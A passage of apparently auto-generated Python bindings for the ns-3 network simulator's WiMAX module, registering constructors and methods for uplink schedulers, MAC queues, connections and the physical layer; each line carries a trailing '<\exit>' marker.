[param('ns3::ServiceFlow::SchedulingType', 'schedulingType')])<\exit>
cls.add_method('SetServiceFlow',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow')])<\exit>
cls.add_method('SetSize',<\exit>
'void',<\exit>
[param('uint32_t', 'size')])<\exit>
cls.add_method('SetSsRecord',<\exit>
'void',<\exit>
[param('ns3::SSRecord *', 'ssRecord')])<\exit>
cls.add_method('SetType',<\exit>
'void',<\exit>
[param('ns3::ReqType', 'type')])<\exit>
return<\exit>
def register_Ns3UlMap_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::UlMap const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('AddUlMapElement',<\exit>
'void',<\exit>
[param('ns3::OfdmUlMapIe', 'ulMapElement')])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetAllocationStartTime',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetUcdCount',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetUlMapElements',<\exit>
'std::list< ns3::OfdmUlMapIe >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetAllocationStartTime',<\exit>
'void',<\exit>
[param('uint32_t', 'allocationStartTime')])<\exit>
cls.add_method('SetUcdCount',<\exit>
'void',<\exit>
[param('uint8_t', 'ucdCount')])<\exit>
return<\exit>
def register_Ns3UplinkScheduler_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::UplinkScheduler const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')])<\exit>
cls.add_method('AddUplinkAllocation',<\exit>
'void',<\exit>
[param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('uint32_t const &', 'allocationSize'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('AllocateInitialRangingInterval',<\exit>
'void',<\exit>
[param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('CalculateAllocationStartTime',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('GetBs',<\exit>
'ns3::Ptr< ns3::BaseStationNetDevice >',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetChannelDescriptorsToUpdate',<\exit>
'void',<\exit>
[param('bool &', 'arg0'), param('bool &', 'arg1'), param('bool &', 'arg2'), param('bool &', 'arg3')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('GetDcdTimeStamp',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetIsInvIrIntrvlAllocated',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetIsIrIntrvlAllocated',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetNrIrOppsAllocated',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTimeStampIrInterval',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetUcdTimeStamp',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetUplinkAllocations',<\exit>
'std::list< ns3::OfdmUlMapIe >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('InitOnce',<\exit>
'void',<\exit>
[],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('OnSetRequestedBandwidth',<\exit>
'void',<\exit>
[param('ns3::ServiceFlowRecord *', 'sfr')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('ProcessBandwidthRequest',<\exit>
'void',<\exit>
[param('ns3::BandwidthRequestHeader const &', 'bwRequestHdr')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('Schedule',<\exit>
'void',<\exit>
[],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('ServiceBandwidthRequests',<\exit>
'void',<\exit>
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('ServiceBandwidthRequests',<\exit>
'bool',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('ServiceUnsolicitedGrants',<\exit>
'void',<\exit>
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('SetBs',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SetDcdTimeStamp',<\exit>
'void',<\exit>
[param('ns3::Time', 'dcdTimeStamp')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SetIsInvIrIntrvlAllocated',<\exit>
'void',<\exit>
[param('bool', 'isInvIrIntrvlAllocated')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SetIsIrIntrvlAllocated',<\exit>
'void',<\exit>
[param('bool', 'isIrIntrvlAllocated')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SetNrIrOppsAllocated',<\exit>
'void',<\exit>
[param('uint8_t', 'nrIrOppsAllocated')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SetTimeStampIrInterval',<\exit>
'void',<\exit>
[param('ns3::Time', 'timeStampIrInterval')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SetUcdTimeStamp',<\exit>
'void',<\exit>
[param('ns3::Time', 'ucdTimeStamp')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SetupServiceFlow',<\exit>
'void',<\exit>
[param('ns3::SSRecord *', 'ssRecord'), param('ns3::ServiceFlow *', 'serviceFlow')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3UplinkSchedulerMBQoS_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::UplinkSchedulerMBQoS const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Time', 'time')])<\exit>
cls.add_method('AddUplinkAllocation',<\exit>
'void',<\exit>
[param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('uint32_t const &', 'allocationSize'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('AllocateInitialRangingInterval',<\exit>
'void',<\exit>
[param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('CalculateAllocationStartTime',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('CheckDeadline',<\exit>
'void',<\exit>
[param('uint32_t &', 'availableSymbols')])<\exit>
cls.add_method('CheckMinimumBandwidth',<\exit>
'void',<\exit>
[param('uint32_t &', 'availableSymbols')])<\exit>
cls.add_method('CountSymbolsJobs',<\exit>
'uint32_t',<\exit>
[param('ns3::Ptr< ns3::UlJob >', 'job')])<\exit>
cls.add_method('CountSymbolsQueue',<\exit>
'uint32_t',<\exit>
[param('std::list< ns3::Ptr< ns3::UlJob > >', 'jobs')])<\exit>
cls.add_method('CreateUlJob',<\exit>
'ns3::Ptr< ns3::UlJob >',<\exit>
[param('ns3::SSRecord *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedType'), param('ns3::ReqType', 'reqType')])<\exit>
cls.add_method('DequeueJob',<\exit>
'ns3::Ptr< ns3::UlJob >',<\exit>
[param('ns3::UlJob::JobPriority', 'priority')])<\exit>
cls.add_method('DetermineDeadline',<\exit>
'ns3::Time',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow')])<\exit>
cls.add_method('EnqueueJob',<\exit>
'void',<\exit>
[param('ns3::UlJob::JobPriority', 'priority'), param('ns3::Ptr< ns3::UlJob >', 'job')])<\exit>
cls.add_method('GetChannelDescriptorsToUpdate',<\exit>
'void',<\exit>
[param('bool &', 'arg0'), param('bool &', 'arg1'), param('bool &', 'arg2'), param('bool &', 'arg3')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetPendingSize',<\exit>
'uint32_t',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow')])<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetUplinkAllocations',<\exit>
'std::list< ns3::OfdmUlMapIe >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('InitOnce',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('OnSetRequestedBandwidth',<\exit>
'void',<\exit>
[param('ns3::ServiceFlowRecord *', 'sfr')],<\exit>
is_virtual=True)<\exit>
cls.add_method('ProcessBandwidthRequest',<\exit>
'void',<\exit>
[param('ns3::BandwidthRequestHeader const &', 'bwRequestHdr')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Schedule',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('ServiceBandwidthRequests',<\exit>
'void',<\exit>
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('ServiceBandwidthRequests',<\exit>
'bool',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('ServiceBandwidthRequestsBytes',<\exit>
'bool',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols'), param('uint32_t', 'allocationSizeBytes')])<\exit>
cls.add_method('ServiceUnsolicitedGrants',<\exit>
'void',<\exit>
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SetupServiceFlow',<\exit>
'void',<\exit>
[param('ns3::SSRecord *', 'ssRecord'), param('ns3::ServiceFlow *', 'serviceFlow')],<\exit>
is_virtual=True)<\exit>
cls.add_method('UplinkSchedWindowTimer',<\exit>
'void',<\exit>
[])<\exit>
return<\exit>
def register_Ns3UplinkSchedulerRtps_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::UplinkSchedulerRtps const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')])<\exit>
cls.add_method('AddUplinkAllocation',<\exit>
'void',<\exit>
[param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('uint32_t const &', 'allocationSize'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('AllocateInitialRangingInterval',<\exit>
'void',<\exit>
[param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('CalculateAllocationStartTime',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetChannelDescriptorsToUpdate',<\exit>
'void',<\exit>
[param('bool &', 'arg0'), param('bool &', 'arg1'), param('bool &', 'arg2'), param('bool &', 'arg3')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetUplinkAllocations',<\exit>
'std::list< ns3::OfdmUlMapIe >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('InitOnce',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('OnSetRequestedBandwidth',<\exit>
'void',<\exit>
[param('ns3::ServiceFlowRecord *', 'sfr')],<\exit>
is_virtual=True)<\exit>
cls.add_method('ProcessBandwidthRequest',<\exit>
'void',<\exit>
[param('ns3::BandwidthRequestHeader const &', 'bwRequestHdr')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Schedule',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('ServiceBandwidthRequests',<\exit>
'void',<\exit>
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('ServiceBandwidthRequests',<\exit>
'bool',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('ServiceUnsolicitedGrants',<\exit>
'void',<\exit>
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SetupServiceFlow',<\exit>
'void',<\exit>
[param('ns3::SSRecord *', 'ssRecord'), param('ns3::ServiceFlow *', 'serviceFlow')],<\exit>
is_virtual=True)<\exit>
cls.add_method('ULSchedulerRTPSConnection',<\exit>
'void',<\exit>
[param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')])<\exit>
return<\exit>
def register_Ns3UplinkSchedulerSimple_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::UplinkSchedulerSimple const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')])<\exit>
cls.add_method('AddUplinkAllocation',<\exit>
'void',<\exit>
[param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('uint32_t const &', 'allocationSize'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('AllocateInitialRangingInterval',<\exit>
'void',<\exit>
[param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('CalculateAllocationStartTime',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetChannelDescriptorsToUpdate',<\exit>
'void',<\exit>
[param('bool &', 'arg0'), param('bool &', 'arg1'), param('bool &', 'arg2'), param('bool &', 'arg3')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetUplinkAllocations',<\exit>
'std::list< ns3::OfdmUlMapIe >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('InitOnce',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('OnSetRequestedBandwidth',<\exit>
'void',<\exit>
[param('ns3::ServiceFlowRecord *', 'sfr')],<\exit>
is_virtual=True)<\exit>
cls.add_method('ProcessBandwidthRequest',<\exit>
'void',<\exit>
[param('ns3::BandwidthRequestHeader const &', 'bwRequestHdr')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Schedule',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('ServiceBandwidthRequests',<\exit>
'void',<\exit>
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('ServiceBandwidthRequests',<\exit>
'bool',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('ServiceUnsolicitedGrants',<\exit>
'void',<\exit>
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SetupServiceFlow',<\exit>
'void',<\exit>
[param('ns3::SSRecord *', 'ssRecord'), param('ns3::ServiceFlow *', 'serviceFlow')],<\exit>
is_virtual=True)<\exit>
return<\exit>
def register_Ns3WimaxConnection_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::WimaxConnection const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::Cid', 'cid'), param('ns3::Cid::Type', 'type')])<\exit>
cls.add_method('ClearFragmentsQueue',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('Dequeue',<\exit>
'ns3::Ptr< ns3::Packet >',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType', default_value='::ns3::MacHeaderType::HEADER_TYPE_GENERIC')])<\exit>
cls.add_method('Dequeue',<\exit>
'ns3::Ptr< ns3::Packet >',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType'), param('uint32_t', 'availableByte')])<\exit>
cls.add_method('Enqueue',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::MacHeaderType const &', 'hdrType'), param('ns3::GenericMacHeader const &', 'hdr')])<\exit>
cls.add_method('FragmentEnqueue',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::Packet const >', 'fragment')])<\exit>
cls.add_method('GetCid',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFragmentsQueue',<\exit>
'std::list< ns3::Ptr< ns3::Packet const > > const',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetQueue',<\exit>
'ns3::Ptr< ns3::WimaxMacQueue >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSchedulingType',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetServiceFlow',<\exit>
'ns3::ServiceFlow *',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetType',<\exit>
'ns3::Cid::Type',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetTypeStr',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('HasPackets',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('HasPackets',<\exit>
'bool',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType')],<\exit>
is_const=True)<\exit>
cls.add_method('SetServiceFlow',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow')])<\exit>
cls.add_method('DoDispose',<\exit>
'void',<\exit>
[],<\exit>
visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3WimaxMacQueue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::WimaxMacQueue const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('uint32_t', 'maxSize')])<\exit>
cls.add_method('CheckForFragmentation',<\exit>
'bool',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType')])<\exit>
cls.add_method('Dequeue',<\exit>
'ns3::Ptr< ns3::Packet >',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType')])<\exit>
cls.add_method('Dequeue',<\exit>
'ns3::Ptr< ns3::Packet >',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType'), param('uint32_t', 'availableByte')])<\exit>
cls.add_method('Enqueue',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::MacHeaderType const &', 'hdrType'), param('ns3::GenericMacHeader const &', 'hdr')])<\exit>
cls.add_method('GetFirstPacketHdrSize',<\exit>
'uint32_t',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType')])<\exit>
cls.add_method('GetFirstPacketPayloadSize',<\exit>
'uint32_t',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType')])<\exit>
cls.add_method('GetFirstPacketRequiredByte',<\exit>
'uint32_t',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType')])<\exit>
cls.add_method('GetMaxSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNBytes',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPacketQueue',<\exit>
'std::deque< ns3::WimaxMacQueue::QueueElement > const &',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetQueueLengthWithMACOverhead',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('GetSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('IsEmpty',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsEmpty',<\exit>
'bool',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType')],<\exit>
is_const=True)<\exit>
cls.add_method('Peek',<\exit>
'ns3::Ptr< ns3::Packet >',<\exit>
[param('ns3::GenericMacHeader &', 'hdr')],<\exit>
is_const=True)<\exit>
cls.add_method('Peek',<\exit>
'ns3::Ptr< ns3::Packet >',<\exit>
[param('ns3::GenericMacHeader &', 'hdr'), param('ns3::Time &', 'timeStamp')],<\exit>
is_const=True)<\exit>
cls.add_method('Peek',<\exit>
'ns3::Ptr< ns3::Packet >',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType')],<\exit>
is_const=True)<\exit>
cls.add_method('Peek',<\exit>
'ns3::Ptr< ns3::Packet >',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType'), param('ns3::Time &', 'timeStamp')],<\exit>
is_const=True)<\exit>
cls.add_method('SetFragmentNumber',<\exit>
'void',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType')])<\exit>
cls.add_method('SetFragmentOffset',<\exit>
'void',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType'), param('uint32_t', 'offset')])<\exit>
cls.add_method('SetFragmentation',<\exit>
'void',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType')])<\exit>
cls.add_method('SetMaxSize',<\exit>
'void',<\exit>
[param('uint32_t', 'maxSize')])<\exit>
return<\exit>
def register_Ns3WimaxMacToMacHeader_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::WimaxMacToMacHeader const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('uint32_t', 'len')])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetSizeOfLen',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3WimaxPhy_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::WimaxPhy const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Attach',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxChannel >', 'channel')])<\exit>
cls.add_method('DoDispose',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetChannel',<\exit>
'ns3::Ptr< ns3::WimaxChannel >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetChannelBandwidth',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetChnlSrchTimeoutEvent',<\exit>
'ns3::EventId',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDataRate',<\exit>
'uint32_t',<\exit>
[param('ns3::WimaxPhy::ModulationType', 'modulationType')],<\exit>
is_const=True)<\exit>
cls.add_method('GetDevice',<\exit>
'ns3::Ptr< ns3::NetDevice >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFrameDuration',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFrameDuration',<\exit>
'ns3::Time',<\exit>
[param('uint8_t', 'frameDurationCode')],<\exit>
is_const=True)<\exit>
cls.add_method('GetFrameDurationCode',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFrameDurationSec',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFrequency',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetGValue',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetMobility',<\exit>
'ns3::Ptr< ns3::Object >',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetNfft',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNrBytes',<\exit>
'uint64_t',<\exit>
[param('uint32_t', 'symbols'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],<\exit>
is_const=True)<\exit>
cls.add_method('GetNrCarriers',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNrSymbols',<\exit>
'uint64_t',<\exit>
